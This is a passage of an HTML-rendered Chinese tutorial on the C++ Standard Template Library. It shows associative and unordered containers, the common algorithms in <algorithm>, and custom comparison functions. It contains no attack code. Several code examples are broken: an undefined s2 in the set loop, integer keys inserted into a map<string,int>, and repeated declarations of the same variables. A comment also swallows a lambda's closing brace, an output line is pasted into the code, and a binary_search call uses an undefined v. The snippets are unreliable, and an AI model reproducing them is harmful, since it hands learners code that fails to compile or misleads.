在尾部插入</span><br>lst.remove(<span class="hljs-number">2</span>);      <span class="hljs-comment">// 移除值为2的元素</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : lst) &#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出：0 1 3 4</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-关联容器"><a href="#2-关联容器" class="headerlink" title="2. 关联容器"></a>2. <strong>关联容器</strong></h5><p>关联容器基于平衡二叉树（通常是红黑树）实现，元素按键值排序，支持快速查找、插入和删除操作。常见的关联容器有：</p><ul><li><code>set</code>：存储唯一的元素，自动按元素的键值排序。</li><li><code>map</code>：键值对（key-value）形式存储元素，按键排序。</li><li><code>multiset</code>：存储允许重复的元素，按键排序。</li><li><code>multimap</code>：存储允许重复的键值对，按键排序。</li></ul><p><strong><code>set</code></strong> 存储唯一元素，自动排序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++">set&lt;<span class="hljs-type">int</span>&gt; s = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;  <span class="hljs-comment">// 自动排序，重复元素被忽略</span><br>s.<span class="hljs-built_in">insert</span>(<span class="hljs-number">5</span>);  <span class="hljs-comment">// 插入新元素</span><br><br><span class="hljs-comment">// 输出 set 中的元素</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span>&amp; x : s) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, x);<br>&#125;<br><span class="hljs-comment">//迭代器写法</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = s<span class="hljs-number">2.</span><span class="hljs-built_in">begin</span>(); it != s<span class="hljs-number">2.</span><span class="hljs-built_in">end</span>(); ++it) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, *it);<br>&#125;<br><br><span class="hljs-comment">//查找元素</span><br><span class="hljs-keyword">auto</span> it = s.<span class="hljs-built_in">find</span>(<span class="hljs-number">3</span>);  <span class="hljs-comment">// 查找元素 3</span><br><span class="hljs-keyword">if</span> (it != s.<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found: %d\n&quot;</span>, *it);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Not found\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//检查元素是否存在，count 要么返回 0（不存在），要么返回 1（存在）。</span><br>std::set&lt;<span class="hljs-type">int</span>&gt; s = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">count</span>(<span class="hljs-number">3</span>)) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3 is in the set\n&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3 is not in the set\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//获取 set 的大小</span><br>set&lt;<span class="hljs-type">int</span>&gt; s = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: %zu\n&quot;</span>, s.<span class="hljs-built_in">size</span>());<br><br><br></code></pre></td></tr></table></figure><p><strong><code>map</code></strong> 键值对形式存储，按键排序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++">map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; m = &#123;&#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">4</span>&#125;, &#123;<span class="hljs-number">3</span>, <span class="hljs-number">5</span>&#125;&#125;; <span class="hljs-comment">// 自动排序，重复键的值会被覆盖</span><br>map&lt;string, <span class="hljs-type">int</span>&gt; m;<br>m.<span class="hljs-built_in">insert</span>(&#123;<span class="hljs-number">1</span>, <span class="hljs-number">10</span>&#125;);<br><span class="hljs-comment">// 插入一个重复的键，不会成功</span><br>m.<span class="hljs-built_in">insert</span>(&#123;<span class="hljs-number">3</span>, <span class="hljs-number">40</span>&#125;);  <span class="hljs-comment">// 键 3 已存在，不会插入</span><br><br><span class="hljs-comment">//查找元素</span><br><span class="hljs-keyword">auto</span> it = m.<span class="hljs-built_in">find</span>(<span class="hljs-number">2</span>);  <span class="hljs-comment">// 查找键为 2 的元素</span><br><span class="hljs-keyword">if</span> (it != m.<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found: %d -&gt; %d\n&quot;</span>, it-&gt;first, it-&gt;second);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Not found\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//删除元素</span><br>m.<span class="hljs-built_in">erase</span>(<span class="hljs-number">2</span>);  <span class="hljs-comment">// 删除键为 2 的元素</span><br><br><span class="hljs-comment">//获取 map 的大小</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: %zu\n&quot;</span>, m.<span class="hljs-built_in">size</span>());<span class="hljs-comment">//Size: 3</span><br><br><br>m[<span class="hljs-string">&quot;apple&quot;</span>] = <span class="hljs-number">3</span>;<br>m[<span class="hljs-string">&quot;banana&quot;</span>] = <span class="hljs-number">2</span>;<br>m[<span class="hljs-string">&quot;orange&quot;</span>] = <span class="hljs-number">4</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; pair : m) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s -&gt; %d\n&quot;</span>, pair.first.<span class="hljs-built_in">c_str</span>(), pair.second);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="3-无序关联容器"><a href="#3-无序关联容器" class="headerlink" title="3. 无序关联容器"></a>3. <strong>无序关联容器</strong></h5><p>无序关联容器是基于哈希表实现的容器，元素无序排列，但支持常数时间复杂度的查找、插入和删除操作。常见的无序关联容器有：</p><ul><li><code>unordered_set</code>：无序集合，元素唯一。</li><li><code>unordered_map</code>：无序键值对，基于哈希表存储。</li></ul><p><strong><code>unordered_set</code></strong> 无序集合，元素唯一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">unordered_set</span>&lt;<span class="hljs-type">int</span>&gt; uset = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;  <span class="hljs-comment">// 重复的1被忽略</span><br>uset.insert(<span class="hljs-number">5</span>);  <span class="hljs-comment">// 插入新元素</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : uset) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出顺序不固定，例如：3 1 2 4 5</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>unordered_map</code></strong> 无序键值对，基于哈希表存储</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">unordered_map&lt;string, <span class="hljs-type">int</span>&gt; umap;<br>umap[<span class="hljs-string">&quot;apple&quot;</span>] = <span class="hljs-number">3</span>;<br>umap[<span class="hljs-string">&quot;banana&quot;</span>] = <span class="hljs-number">2</span>;<br>umap[<span class="hljs-string">&quot;orange&quot;</span>] = <span class="hljs-number">4</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; [key, value] : umap) &#123;<br>    cout &lt;&lt; key &lt;&lt; <span class="hljs-string">&quot;: &quot;</span> &lt;&lt; value &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-comment">// 输出顺序不固定，例如：</span><br>banana: <span class="hljs-number">2</span> apple: <span class="hljs-number">3</span> orange: <span class="hljs-number">4</span><br> &#125;<br><br></code></pre></td></tr></table></figure><h4 id="三、算法-Algorithms"><a href="#三、算法-Algorithms" class="headerlink" title="三、算法 (Algorithms)"></a>三、算法 (Algorithms)</h4><p>STL 提供了一系列的算法来操作容器，如排序、查找、修改等。这些算法定义在头文件 <code>&lt;algorithm&gt;</code> 中，并且可以通过迭代器访问容器的元素。</p><h5 id="1-常用算法"><a href="#1-常用算法" class="headerlink" title="1. 常用算法"></a>1. <strong>常用算法</strong></h5><ul><li><code>sort</code>：对容器进行排序。</li><li><code>find</code>：查找某个元素。</li><li><code>binary_search</code>：二分查找，要求容器是有序的。</li><li><code>reverse</code>：将容器中的元素反转。</li><li><code>accumulate</code>：计算容器中元素的累加和。</li><li><code>count</code>：统计容器中某个元素的出现次数。</li></ul><p><strong><code>sort</code></strong> 对容器进行排序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-built_in">sort</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 升序排序</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : vec) &#123;<br>    cout &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出：1 2 3 4 5</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>find</code></strong> 查找某个元素</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-keyword">auto</span> it = std::<span class="hljs-built_in">find</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span> (it != vec.<span class="hljs-built_in">end</span>()) &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Element found: &quot;</span> &lt;&lt; *it &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出：Element found: 3</span><br> &#125; <span class="hljs-keyword">else</span> &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Element not found\n&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong><code>binary_search</code></strong> 二分查找（要求容器是有序的）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">bool</span> found = <span class="hljs-built_in">binary_search</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span> (found) &#123;<br>     cout &lt;&lt; <span class="hljs-string">&quot;Element found\n&quot;</span>;  <span class="hljs-comment">// 输出：Element found</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>     cout &lt;&lt; <span class="hljs-string">&quot;Element not found\n&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong><code>reverse</code></strong> 将容器中的元素反转</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-built_in">reverse</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>());<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : vec) &#123;<br>   cout &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出：5 4 3 2 1</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>accumulate</code></strong> 计算容器中元素的累加和</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span> sum = <span class="hljs-built_in">accumulate</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);  <span class="hljs-comment">// 初始值为0</span><br>cout &lt;&lt; <span class="hljs-string">&quot;Sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出：Sum: 15</span><br></code></pre></td></tr></table></figure><p><strong><code>count</code></strong> 统计容器中某个元素的出现次数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span> cnt = <span class="hljs-built_in">count</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">2</span>);<br>cout &lt;&lt; <span class="hljs-string">&quot;Count of 2: &quot;</span> &lt;&lt; cnt &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出：Count of 2: 3</span><br></code></pre></td></tr></table></figure><h5 id="2-自定义比较函数"><a href="#2-自定义比较函数" class="headerlink" title="2. 自定义比较函数"></a>2. <strong>自定义比较函数</strong></h5><p><strong><code>sort</code></strong> 使用自定义比较函数</p><p>默认情况下，<code>sort</code> 会进行升序排序。我们可以通过传递一个自定义比较函数来控制排序方式。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 自定义比较函数，实现降序排序</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">descending</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> a &gt; b;<br>&#125;<br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-built_in">sort</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), descending);  <span class="hljs-comment">// 使用自定义比较函数</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : vec) &#123;<br>      cout &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出：5 4 3 2 1</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; v = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>&#125;;<br>    <span class="hljs-comment">// 使用 Lambda 表达式作为自定义比较函数，按降序排序</span><br>    <span class="hljs-built_in">sort</span>(v.<span class="hljs-built_in">begin</span>(), v.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) &#123; <span class="hljs-keyword">return</span> a &gt; b; &#125;);<br>    <span class="hljs-comment">// 输出排序后的结果</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : v) &#123;<br>        cout &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">//对结构体数组排序</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>    std::string name;<br>    <span class="hljs-type">int</span> age;<br>&#125;;<br><span class="hljs-comment">// 自定义比较函数，按年龄升序排序</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">compareByAge</span><span class="hljs-params">(<span class="hljs-type">const</span> Person&amp; a, <span class="hljs-type">const</span> Person&amp; b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> a.age &lt; b.age;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    vector&lt;Person&gt; people = &#123;&#123;<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">30</span>&#125;, &#123;<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-number">25</span>&#125;, &#123;<span class="hljs-string">&quot;Charlie&quot;</span>, <span class="hljs-number">35</span>&#125;&#125;;<br>    <span class="hljs-comment">// 使用自定义比较函数按年龄升序排序</span><br>    <span class="hljs-built_in">sort</span>(people.<span class="hljs-built_in">begin</span>(), people.<span class="hljs-built_in">end</span>(), compareByAge);<br>    <span class="hljs-comment">// 使用 Lambda 表达式按年龄升序排序</span><br>    std::<span class="hljs-built_in">sort</span>(people.<span class="hljs-built_in">begin</span>(), people.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">const</span> Person&amp; a, <span class="hljs-type">const</span> Person&amp; b) &#123;<span class="hljs-keyword">return</span> a.age &lt; b.age;&#125;);<br>    <span class="hljs-comment">// 输出排序后的结果</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> Person&amp; p : people) &#123;<br>        cout &lt;&lt; p.name &lt;&lt; <span class="hljs-string">&quot;: &quot;</span> &lt;&lt; p.age &lt;&lt; endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>find_if</code></strong> 使用自定义条件</p><p><code>find_if</code> 可根据自定义的 <strong>谓词函数</strong> 查找符合条件的元素。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; v = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">20</span>&#125;;<br><span class="hljs-comment">// 使用 lambda 表达式查找第一个大于 10 且是偶数的元素</span><br><span class="hljs-keyword">auto</span> it = std::<span class="hljs-built_in">find_if</span>(v.<span class="hljs-built_in">begin</span>(), v.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">int</span> x) &#123; <span class="hljs-keyword">return</span> x &gt; <span class="hljs-number">10</span> &amp;&amp; x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>; &#125;);<br><span class="hljs-keyword">if</span> (it != v.<span class="hljs-built_in">end</span>()) &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Found: &quot;</span> &lt;&lt; *it &lt;&lt; std::endl;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Not found&quot;</span> &lt;&lt; std::endl;<br>&#125;<br><br><br>map&lt;string, <span class="hljs-type">int</span>&gt; m = &#123;&#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-string">&quot;orange&quot;</span>, <span class="hljs-number">3</span>&#125;&#125;;<br><span class="hljs-comment">// 查找第一个键大于 &quot;banana&quot; 的元素</span><br><span class="hljs-keyword">auto</span> it = <span class="hljs-built_in">find_if</span>(m.<span class="hljs-built_in">begin</span>(), m.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">const</span> pair&lt;string, <span class="hljs-type">int</span>&gt;&amp; p) &#123;<span class="hljs-keyword">return</span> p.first &gt; <span class="hljs-string">&quot;banana&quot;</span>;  <span class="hljs-comment">// 按照键的字典顺序&#125;);</span><br><span class="hljs-keyword">if</span> (it != m.<span class="hljs-built_in">end</span>()) &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Found: &quot;</span> &lt;&lt; it-&gt;first &lt;&lt; <span class="hljs-string">&quot; -&gt; &quot;</span> &lt;&lt; it-&gt;second &lt;&lt; std::endl;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Not found&quot;</span> &lt;&lt; std::endl;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong><code>binary_search</code></strong> 自定义比较函数</p><p><code>binary_search</code> 也可以接受自定义的比较函数，但要求容器中的元素按该规则预先排序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 自定义比较函数，进行降序比较</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">descending</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> a &gt; b;<br>&#125;<br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-built_in">sort</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), descending);  <span class="hljs-comment">// 降序排序</span><br><span class="hljs-type">bool</span> found = <span class="hljs-built_in">binary_search</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>, descending);<br>  <span class="hljs-type">bool</span> found = std::<span class="hljs-built_in">binary_search</span>(v.<span class="hljs-built_in">begin</span>(), v.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>, [](<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) &#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(a) &lt; <span class="hljs-built_in">abs</span>(b); &#125;);<br><span class="hljs-keyword">if</span> (found) &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Element found\n&quot;</span>;  <span class="hljs-comment">// 输出：Element found</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  cout &lt;&lt; <span class="hljs-string">&quot;Element not found\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>set</code></strong> 自定义比较函数（按降序存储）</p><p>C++ 中的 <strong><code>set</code></strong> 默认是升序排序。我们可以自定义一个比较函数来改变排序顺序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 自定义比较函数，按降序排序</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Descending</span> &#123;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> <span class="hljs-type">const</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> a &gt; b;<br>    &#125;<br>&#125;;<br>set&lt;<span class="hljs-type">int</span>, Descending&gt; s = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>set&lt;<span class="hljs-type">int</span>, <span class="hljs-keyword">decltype</span>([](<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) &#123; <span class="hljs-keyword">return</span> a &gt; b; &#125;)&gt; <span class="hljs-built_in">s</span>([](<span class="hljs-type">int</span> a, 